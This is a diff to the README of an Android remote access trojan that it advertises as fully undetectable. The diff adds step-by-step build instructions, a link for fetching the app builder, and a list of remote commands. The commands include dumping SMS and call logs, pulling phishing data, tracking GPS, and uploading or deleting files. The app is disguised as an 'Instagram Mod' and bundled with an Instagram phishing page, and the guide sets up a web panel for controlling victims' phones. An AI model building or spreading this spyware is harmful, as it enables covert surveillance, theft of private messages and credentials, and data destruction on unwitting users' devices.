@@ -1,3 +1,20 @@
+<!--https://www.mediafire.com/file/989up6hj5i89kak/Sketchware_Pro_6.3.0_fix1.apk/file-->
+<!--openfolder * <FOLDER_DIR>
+uploadfile * <FILE_DIR>
+deletefile * <FILE_DIR>
+makefolder * <FILE_DIR>
+shownotify * <YOUR_MSG>
+openweburi * <URL>
+internaldir
+installedapps
+sysinfo
+dumpsms
+showphishdata
+getgpslocation
+getnetworklocation
+dmpcalllog  -->
+
+
 <h1 align='center'>Ω</h1>
 
 <h2 align='center'>Android RAT</h1>
@@ -22,7 +39,7 @@
 - [X] No Port Forwarding Needed
 - [X] Fully Undetectable
 - [X] WipeSdcard
-- [X] Pre Combined [Instagram Webview Phising](https://gitHub.com/Th30neAnd0nly/PI)
+- [X] Pre Binded [Instagram Webview Phising](https://gitHub.com/Th30neAnd0nly/PI)
 ---
 
 ## Requirements
@@ -34,17 +51,40 @@
 1. After Creating a Firebase account you have to enable  Authentication , Firebase Storage , Realtime Database.
 1. Now go to Authentication  and in Sign Method section enable Email/Password Method.
 1. After that in Realtime Database Go to rules and set ``` .read ``` and ``` .write ``` to ```true``` 
+1. Also Set Some Data as shown in image.
+1. <img src="images/img2.png">
 1. Now Go to Project Overview and add a new Android App and Download it's ```google-services.json``` file , which will contain your app's API key and other information.
 1. Add another Web App and Copy it's ``` Config ``` .
 1. You can setup your web panel on localhost or on Any Hosting Site.
 1. Open ``` app.js ``` and paste the ```Config``` and save it .
 1. Your Web Panel is ready now let's build the App.
 1. Download [Sketchware Pro](https://www.mediafire.com/file/989up6hj5i89kak/Sketchware_Pro_6.3.0_fix1.apk/file)
-1. Open the ``` Instagram Mod.swb ``` file in Sketchware Pro
+1. Click on Restore option and select  ``` Instagram Mod.swb ``` file in Sketchware Pro
 1. Now open the project and in Library Menu  go to  Firebase Section and fill all the data using ```google-services.json``` file.
+1. <img src="images/img3.png">
 1. Now click on **Run** to Build the App , use any APK Signer Tool to sign it.
 1. You app is Now ready.
-1. When user will install the app his/her session will appear on Web Panel click on the User to Start Connection with that specified Device.
+1. When user will install the app his/her session will appear on Web Panel click on the User to establish Connection with that specified Device.
+
+---
+
+## List of Commands
+
+* openfolder * {FOLDER_DIR}
+* uploadfile * {FILE_DIR}
+* deletefile * {FILE_DIR}
+* makefolder * {FILE_DIR}
+* shownotify * {YOUR_MSG}
+* openweburi * {URL}
+* internaldir
+* installedapps
+* sysinfo
+* dumpsms
+* showphishdata
+* getgpslocation
+* getnetworklocation
+* dmpcalllog
+
 
 ---
 
